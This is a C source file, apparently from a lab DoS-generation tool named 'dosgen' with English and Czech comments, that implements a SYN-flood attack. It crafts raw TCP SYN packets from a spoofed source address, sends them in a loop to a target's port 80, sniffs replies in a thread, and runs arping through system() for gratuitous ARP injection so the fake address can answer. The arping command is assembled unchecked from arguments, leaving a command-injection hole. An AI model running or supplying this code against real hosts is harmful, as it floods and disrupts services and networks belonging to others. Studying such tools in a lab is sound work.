#include <stdio.h> //standard stuff (printf..)
#include <stdlib.h> //malloc
#include <string.h> //memset
#include <netinet/tcp.h> //declaration for tcp header
#include <netinet/ip.h> //declaration for ip header
#include <pthread.h> //threads
#include <errno.h> //strerr
#include <netdb.h> //NI_MAXHOST, NI_NUMERICHOST
#include <ifaddrs.h> //getifaddrs func
#include <time.h> //random
#include <signal.h> 

#include "handshake.h"

void hostname_toip(char *dst, struct in_addr *dst_ip);
char* get_local_ip();
void start_tcp_attack(char *argv[]);
void send_arp(char *argv[]);
void call_arping(char *argv[]);

int tcp_gen(int argc, char *argv[])
{

    //TODO
    //ask for a static ip??
    //
    //Using timeval structure for actual time
    //Pouziti timeval struktury pro aktualni cas
    struct timeval time;
    gettimeofday(&time, NULL);
    //srand(t1.tv_usec * t1.tv_sec);

    //Making sure when the rand function is called in parallel threads, it will generate different values
    //Zajisteni toho, ze pri volani rand funkce v paralelnich vlaknech bude vygenerovana jina hodnota
    srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

    char *ip_array[5];

    ip_array[0] = argv[0];//attack type
    ip_array[1] = argv[1];//hostname
    ip_array[2] = argv[2];//URI
    ip_array[3] = argv[3];//dev
    //Specifying fake IP used for the attacks. Will be passed also to arping for arp injection.
    //Specifikace falesne IP adresy, ktera bude pouzita pri utoku, predana take nastroji arping pro injekci
    ip_array[4] = "192.168.56.150";

    pthread_t thread1;

    //Creating thread with start_sniffing() function call, will start receiving packets and process them
    //Vytvoreni vlakna pro zavolani funkce pcap_loop a zachytavani, zpracovani paketu
    if(pthread_create(&thread1, NULL, (void *)start_sniffing, argv) < 0)
    {
        fprintf(stderr, "Failed to create a new thread.\n");
        return -1;
    }
    printf("Starting to sniff packets.\n");

    char *params[] = {ip_array[3], ip_array[4], ip_array[1]};
    
    pthread_t arping_th;

    //Thread creation for packet injection
    //Vytvoreni vlakna pro injekci paketu
    if(pthread_create(&arping_th, NULL, (void *) call_arping, params) < 0)
    {
        fprintf(stderr, "Failed to create a thread for arping.\n");
        return -1;
    }
    if ( pthread_detach(arping_th) == 0 )
        printf("Arping thread detached successfully.\n");

    sleep(1); //argv[4] == connections [-C], passed to ./dosgen
    for(int i = 0; i < atoi(argv[4]); i++)
    {
        //sleep(1);
        //Calling function in a loop, which will send as many SYN packets as specified by argv[4]
        //Volani funkce ve smycce, coz posle tolik SYN packetu serveru, kolik je specifikovanych v argv[4]
        start_tcp_attack(ip_array);
        printf("Connection #%d started.\n", i);

        fflush(stdout);
    }
    //Waiting for packet sniffing to end
    //Cekani na funkci pro zachytavani paketu, dokud neskonci
    pthread_join(thread1, NULL);

    return 0;
}

void start_tcp_attack(char *argv[])
{
    int sock_raw;

    struct in_addr dst_ip;

    char source_ip[25] = "";
    strcpy(source_ip, argv[4]);

    //Generating random sequence number and src port to be used inside SYN packets
    //Source ports will be in range 50000-59999
    //Generovani sekvencniho cisla a zdrojoveho portu pro SYN packety
    //Zdrojove porty budou v rozsahu od 50 do 60ti tisic
    u_int16_t seq_n = (rand() % 10000);
    u_int16_t source_port = (rand() % 10000) + 50000;

    //Creating raw socket 
    //Vytvoreni raw soketu
    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    fflush(stdout);
    if(sock_raw < 0)
    {
        perror("Socket error\n");
        //printf("Either run this program as root, or grant CAP_NET_RAW to %s\n", argv[0]);
        exit(-1);
    }

    char *dst;
    dst = argv[1];

    //If hostname (argv[1]) is specified in numbers-and-dots notation, directly fill dst_ip structure
    //Pokud je hostname specifikovano ve formatu IP adresy, je primo naplnena dst_ip struktura
    if(inet_addr(dst) != INADDR_NONE)
    {
        //inet_addr converts dst from numbers-dots notaion to network byte order
        //inet_addr prevadi dst z formatu pro vypis do formatu pro odeslani do site
        //printf("Directly filling dst_ip.\n");
        dst_ip.s_addr = inet_addr(dst);
    }
    else
    {
        //Calls function hostname_toip which translates hostname to IP
        //Funkce pro preklad domenoveho jmena na IP adresu
        //printf("Calling addrinfo function, with a host: '%s'\n", dst);
        hostname_toip(dst, &dst_ip);
    }

    //Structure declaration for packet creation
    //Deklarovani struktur pro vytvoreni paketu
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    char *packet_to_send;
    packet_to_send = (char *) malloc(60);
    if(packet_to_send == NULL)
    {
        perror("Could not allocate packet_to_send mem on heap.\n");
        exit(-1);
    }

    //Zero out the packet memory area
    //Vynulovani pameti pro paket
    bzero(packet_to_send, 60);
    //Filling in the IP header
    //Naplneni IP hlavicky
    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12345);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0; //Will be calculated afterwards / Je vypoctena posleze
    iph.ip_src.s_addr = inet_addr(source_ip);
    iph.ip_dst.s_addr = dst_ip.s_addr;

    //Checksum calculation
    //Vypocet kontrolniho souctu
    iph.ip_sum = chksum((unsigned short *) packet_to_send, sizeof(struct ip));

    memcpy(packet_to_send, &iph, sizeof(iph));

    //Filling in the TCP header
    //Naplneni TCP hlavicky
    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq_n);
    tcph.th_ack = 0;
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    //TH_SYN is for SYN flag to be set as 1
    //TH_SYN znaci nastaveni SYN priznaku na 1 
    tcph.th_flags = TH_SYN;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    //Checkum calculation
    //Vypocet kontrolniho souctu
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy((packet_to_send + sizeof(iph)), &tcph, sizeof(tcph));

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    //IP_HDRINCL znaci kernelu, ze IP hlavicka je soucasti
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        //fprintf(stderr, "Error setting up setsockopt!\n");
        perror("Error setting up setsockopt for SYN packet!\n");
        exit(-1);
    }

    //dest - sockaddr_in
    //Filling in dest structure needed for sendto function
    //Naplneni dest (sockaddr_in) struktury nezbytne pro sendto funkci
    bzero(&dest, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    //Send the packet out to the net
    //Odeslani paketu do site
    if(sendto(sock_raw, packet_to_send, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Error sending syn packet!\n");
        exit(1);
    }
    close(sock_raw);
    free(packet_to_send);
}

void hostname_toip(char *dst, struct in_addr *dst_ip)
{
    struct addrinfo hints, *result;
    int addrinfores = 0;

    //Filling in help structure for passing to getaddrinfo function
    //Naplneni pomocne struktury pro predani do getaddrinfo funkce
    bzero(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    //Translating hostname to IP
    //Preklad domenoveho jmena na IP adresu pro port 80
    addrinfores = getaddrinfo(dst, "80", &hints, &result);

    if(addrinfores != 0)
    {
        perror("Hostname getaddrinfo error\n");
        exit(0);
    }

    struct sockaddr_in *addr;
    //Casting sockaddr to sockaddr_in which I need for writing to stdout
    //Pretypovani do sockaddr_in, coz je nutne pro vypis do stdout
    addr = (struct sockaddr_in *) result->ai_addr;

    freeaddrinfo(result);
    //printf("You address: %s\n", inet_ntoa((struct in_addr) addr->sin_addr));

    //ai_addr is a struct in_addr what is the same type as dst_ip
    //result->ai_addr je struktura in_addr, ktera je totozna s dst_ip
    *dst_ip = addr->sin_addr;

    //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
}

void call_arping(char *argv[])
{
    //sleep(2);
    char arping_params[65];
    //Arp injection using arping tool with -q quiet, -A answering mode - gratious packets, -I iface, -s source ip, destination
    //Will run program as a different pid, but will be killed after pressing ^C, if program will not fail 
    //Injekce packetu pomoci nastroje arping s -q tichy mod, -A odpovidaci mod - gratious pakety, -I rozhrani, -s zdrojova IP, cil
    //Bude spusten s jinym pid, nez dosgen a bude ukoncen po stisku klaves ^C, pokud program jinak neselze
    sprintf(arping_params, "/usr/bin/arping -q -A -I %s -s %s %s", argv[0], argv[1], argv[2]);
    system(arping_params);
}

//Possibly usefull function for getting local IP 
//Mozno uzitecna funkce pro zjisteni localni IP
/*char* get_local_ip()
{
    char *device, errbuff[PCAP_ERRBUF_SIZE];
    bpf_u_int32 net, mask;
    char *source_ip;
    source_ip = (char *) malloc(20);
    if(source_ip == NULL)
    {
        perror("Could not allocate source_ip mem on heap.\n");
        exit(-1);
    }

    device = pcap_lookupdev(errbuff);
    printf("Your default device is: %s\n", device);

    pcap_lookupnet(device, &net, &mask, errbuff);

    struct ifaddrs *ifaddr, *ifa;
    char host[NI_MAXHOST];
    getifaddrs(&ifaddr);

    for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if(ifa->ifa_addr == NULL)
            continue;
        //min 8 field width between prints, with left alignment '-'
        //printf("%-8s\n", ifa->ifa_name);

        getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if(*(ifa->ifa_name) == *device && ifa->ifa_addr->sa_family==AF_INET)
        {
            //printf("IP: %s\n", host);
            strcpy(source_ip, host);
        }
    }
    return source_ip;

}*/
